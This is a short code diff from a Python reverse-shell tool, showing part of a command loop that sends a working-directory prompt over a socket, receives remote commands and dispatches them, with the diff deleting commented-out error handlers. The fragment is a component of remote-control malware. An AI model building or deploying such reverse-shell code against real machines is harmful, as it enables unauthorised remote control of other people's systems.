@@ -46,7 +46,6 @@ def reverse_shell():
         else:
             cli = f"{cwd}$"
             s.send(cli.encode(FORMAT))
-        # try:
         output = s.recv(BUF_SIZE).decode(FORMAT)
         output_split = output.split(" ")
         if "exit" == output:
@@ -118,18 +117,6 @@ def reverse_shell():
         else:
             other_command(output)
             continue
-    # except AttributeError as i:
-    #     s.send(f"wrong options, Error: {i}".encode('utf-8'))
-    #     continue
-    # except Exception as e:
-    #     s.send(f"the problem is : {e}".encode('utf-8'))
-    #     continue
-    # except BrokenPipeError as d:
-    #     s.send(f"wrong options, Error: {d}".encode('utf-8'))
-    #     continue
-    # except KeyboardInterrupt as o:
-    #     s.send(f"wrong options, Error: {o}".encode('utf-8'))
-    #     continue
 
 
 def powershell(OS, output):
